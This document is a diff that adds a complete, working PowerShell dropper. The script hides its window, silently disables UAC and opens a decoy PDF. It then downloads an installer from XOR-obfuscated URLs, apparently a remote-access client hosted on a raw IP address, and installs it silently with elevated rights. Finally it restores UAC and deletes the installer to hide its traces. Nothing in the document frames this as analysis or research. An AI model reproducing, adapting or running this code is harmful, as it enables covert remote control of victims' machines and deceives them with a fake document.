@@ -1,0 +1,106 @@
+$ErrorActionPreference   = "SilentlyContinue"
+$WarningPreference       = "SilentlyContinue"
+$VerbosePreference       = "SilentlyContinue"
+$ProgressPreference      = "SilentlyContinue"
+
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+
+Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "$p=''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System''; Set-ItemProperty -Path $p -Name EnableLUA -Type DWord -Value 0; Set-ItemProperty -Path $p -Name ConsentPromptBehaviorAdmin -Type DWord -Value 0; Set-ItemProperty -Path $p -Name PromptOnSecureDesktop -Type DWord -Value 0;'
+
+function Force-FileDelete {
+    param(
+        [string]$Path
+    )
+
+    if ([System.IO.File]::Exists($Path)) {
+        try {
+            [System.IO.File]::Delete($Path)
+        } catch {
+            $dir  = [System.IO.Path]::GetDirectoryName($Path)
+            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
+            $ext  = [System.IO.Path]::GetExtension($Path)
+
+            $counter = 1
+            do {
+                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
+                $counter++
+            } while ([System.IO.File]::Exists($newPath))
+
+            try {
+                [System.IO.File]::Move($Path, $newPath)
+            } catch {
+                
+            }
+        }
+    } else {
+       
+    }
+}
+
+function CODE_SEG {
+     param(
+        [Parameter(Mandatory)][string] $Name, 
+        [Parameter(Mandatory)][string] $PdfURL,
+        [Parameter(Mandatory)][string] $InstallerURL 
+    )
+    
+  [Net.ServicePointManager]::SecurityProtocol = `
+    [Net.SecurityProtocolType]::Ssl3  -bor `
+    [Net.SecurityProtocolType]::Tls   -bor `
+    [Net.SecurityProtocolType]::Tls11 -bor `
+    [Net.SecurityProtocolType]::Tls12 -bor `
+    [Net.SecurityProtocolType]::Tls13
+
+    Add-Type -Name Window -Namespace Console -MemberDefinition @'
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@
+
+    $ConsoleWin = [Console.Window]::GetConsoleWindow()
+    [Console.Window]::ShowWindow($ConsoleWin, 0)
+
+    $CurrentDir = (Get-Location).Path
+    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
+    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
+
+    Write-Host "Ink Path: $InkPath"
+    Write-Host "PDF Path: $PdfPath"
+
+    Force-FileDelete -Path $InkPath
+    Force-FileDelete -Path $PdfPath
+
+    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -ErrorAction SilentlyContinue
+    Start-Process $PdfPath -ErrorAction SilentlyContinue
+
+    $InstallerURI = [System.Uri] $InstallerURL
+    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
+    $RandomFileName = [System.IO.Path]::GetRandomFileName()
+    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
+    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
+    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")
+
+    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
+    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
+    
+    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
+    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru
+
+    Write-Host " Exit code: $($Process.ExitCode)"
+
+    try {
+        [System.IO.File]::Delete($InstallerPath)
+    } catch {
+        
+    }
+
+    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "$p=''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System''; Set-ItemProperty -Path $p -Name EnableLUA -Type DWord -Value 1; Set-ItemProperty -Path $p -Name ConsentPromptBehaviorAdmin -Type DWord -Value 5; Set-ItemProperty -Path $p -Name PromptOnSecureDesktop -Type DWord -Value 1; Add-Type -TypeDefinition ''using System; using System.Runtime.InteropServices; public class Shell { [DllImport(\"shell32.dll\")] public static extern void SHChangeNotify(int wEventId,uint uFlags,IntPtr dwItem1,IntPtr dwItem2); }''; [Shell]::SHChangeNotify(0x08000000,0x0005,[IntPtr]::Zero,[IntPtr]::Zero); Start-Sleep -Milliseconds 800; [Shell]::SHChangeNotify(0x08000000,0x0005,[IntPtr]::Zero,[IntPtr]::Zero)"'
+}
+
+$ClientName     = $($k6734='zy!NQ]@?xsI';$b=[byte[]](0x3B,0x1A,0x4A,0x20,0x3E,0x2A,0x2C,0x5A,0x1C,0x14,0x2C,0x17,0x1C,0x4F,0x3A,0x0E,0x0F,0x25,0x4F,0x17,0x01,0x3D,0x2A,0x3D,0x67);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6734);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+$DocumentURL    = $($k2290=250;$b=[byte[]](0x92,0x8e,0x8e,0x8a,0x89,0xc0,0xd5,0xd5,0x88,0x9b,0x8d,0xd4,0x9d,0x93,0x8e,0x92,0x8f,0x98,0x8f,0x89,0x9f,0x88,0x99,0x95,0x94,0x8e,0x9f,0x94,0x8e,0xd4,0x99,0x95,0x97,0xd5,0x9b,0x96,0x9f,0x82,0x9b,0x9b,0x91,0x9b,0xd5,0xb3,0x95,0xd5,0x88,0x9f,0x9c,0x89,0xd5,0x92,0x9f,0x9b,0x9e,0x89,0xd5,0x97,0x9b,0x93,0x94,0xd5,0xbb,0x99,0x91,0x94,0x95,0x8d,0x96,0x9f,0x9e,0x9d,0x9f,0x97,0x9f,0x94,0x8e,0xa5,0xa8,0x9f,0x8a,0x95,0x88,0x8e,0xaa,0xbe,0xbc,0xd4,0x8a,0x9e,0x9c);-join($b|%{[char]($_-bxor$k2290)}))
+$ClientURL      = $($k5072=223;$b=[byte[]](0xb7,0xab,0xab,0xaf,0xe5,0xf0,0xf0,0xee,0xeb,0xe8,0xf1,0xee,0xed,0xeb,0xf1,0xed,0xee,0xe6,0xf1,0xee,0xea,0xef,0xe5,0xe7,0xef,0xeb,0xef,0xf0,0x9d,0xb6,0xb1,0xf0,0x8c,0xbc,0xad,0xba,0xba,0xb1,0x9c,0xb0,0xb1,0xb1,0xba,0xbc,0xab,0xf1,0x9c,0xb3,0xb6,0xba,0xb1,0xab,0x8c,0xba,0xab,0xaa,0xaf,0xf1,0xb2,0xac,0xb6,0xe0,0xba,0xe2,0x9e,0xbc,0xbc,0xba,0xac,0xac,0xf9,0xa6,0xe2,0x98,0xaa,0xba,0xac,0xab);-join($b|%{[char]($_-bxor$k5072)}))
+
+CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
